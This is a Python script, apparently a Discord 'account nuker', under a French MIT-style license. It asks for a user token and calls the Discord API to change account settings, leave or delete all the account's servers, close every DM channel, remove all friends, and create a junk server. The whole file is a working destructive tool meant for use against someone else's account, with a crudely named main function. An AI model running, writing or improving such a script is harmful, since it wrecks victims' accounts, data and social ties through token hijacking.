LICNECE = """
Copyright © 2021 𓇬| gozen#0666
L'autorisation est accordée par la présente, gratuitement, à toute personne obtenant une copie de ce logiciel et des fichiers de documentation associés (le "logiciel"), de traiter le logiciel sans restriction, y compris, sans s'y limiter, les droits d'utilisation, de copie, de modification, de fusion, de publication, de distribution, de sous-licence et/ou de vente de copies du logiciel, et d'autoriser les personnes à qui le logiciel est fourni à le faire, sous réserve des conditions suivantes :
L'avis de copyright ci-dessus et cet avis d'autorisation doivent être inclus dans toutes les copies ou parties substantielles du logiciel.
LE LOGICIEL EST FOURNI " EN L'ÉTAT ", SANS GARANTIE D'AUCUNE SORTE, EXPRESSE OU IMPLICITE, Y COMPRIS, MAIS SANS S'Y LIMITER, LES GARANTIES DE QUALITÉ MARCHANDE, D'ADÉQUATION À UN USAGE PARTICULIER ET DE NON-VIOLATION. EN AUCUN CAS, LES AUTEURS OU LES DÉTENTEURS DE DROITS D'AUTEUR NE POURRONT ÊTRE TENUS RESPONSABLES DE TOUTE RÉCLAMATION, DE TOUT DOMMAGE OU DE TOUTE AUTRE RESPONSABILITÉ, QUE CE SOIT DANS LE CADRE D'UNE ACTION CONTRACTUELLE, DÉLICTUELLE OU AUTRE, DÉCOULANT DE OU EN RELATION AVEC LE LOGICIEL OU L'UTILISATION OU TOUTE AUTRE TRANSACTION DU LOGICIEL.
"""

from colored import fg, attr
import requests

r = fg(241) # Setup color variables
r2 = fg(255)
b = fg(31)
w = fg(15)

def rape():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Authorization' : input(f"\n {r}[{w}?{r}] Token: ")
    }

    payload = {"theme" : "light","locale" : "ja","message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}

    print(f"\n {r}[{w}+{r}] Changeing settings")
    requests.patch(
        "https://canary.discordapp.com/api/v6/users/@me/settings",
        headers = headers,
        json = payload
    )
    print(f"\n {r}[{w}+{r}] Detecting servers")

    guilds = requests.get(
        "https://discord.com/api/v6/users/@me/guilds",
        headers = headers
    ).json()

    print(f" {r}[{w}!{r}] {len(guilds)} servers found\n")

    for i in guilds:
        try:
            print(f"  {r}[{w}!{r}] Leaving {i['name']} | Owner: {i['owner']}")
            if not i["owner"]:
                responce = requests.delete(
                    f"https://discord.com/api/users/@me/guilds/{i['id']}",
                    headers = headers
                )
            else:
                responce = requests.delete(
                    f"https://discord.com/api/guilds/{i['id']}",
                    headers = headers
                )
        except Exception as e:
            print(e)

    print(f"\n {r}[{w}+{r}] Detecting DM channels")

    dms = requests.get(
        "https://discord.com/api/v6/users/@me/channels",
        headers = headers
    ).json()
    print(f" {r}[{w}!{r}] {len(guilds) - 1} DM channels found\n")

    for i in dms:
        print(f"  {r}[{w}!{r}] Leaving DM channel with: {', '.join([x['username'] for x in i['recipients']])}")
        responce = requests.delete(
            f"https://discord.com/api/channels/{i['id']}",
            headers = headers
        )

    print(f"\n {r}[{w}+{r}] Detecting relationships")

    relations = requests.get(
    "https://discord.com/api/v8/users/@me/relationships",
    headers = headers
    ).json()

    relations = [i for i in relations if i["type"] != 0]

    print(f" {r}[{w}!{r}] {len(relations)} relationships found@n")

    for i in relations:
        print(f"  {r}[{w}!{r}] Removing {i['user']['username']} from relationships")
        responce = requests.put(
            f"https://discord.com/api/v8/users/@me/relationships/{i['user']['id']}",
            headers = headers,
            json = {"type":0}
        )

    guild = {
        "channels" : None,
        "icon" : None,
        "name" : "lol",
        "region" : "japan"
    }
    requests.post(
        'https://discordapp.com/api/v6/guilds',
        headers = headers,
        json = guild
    )
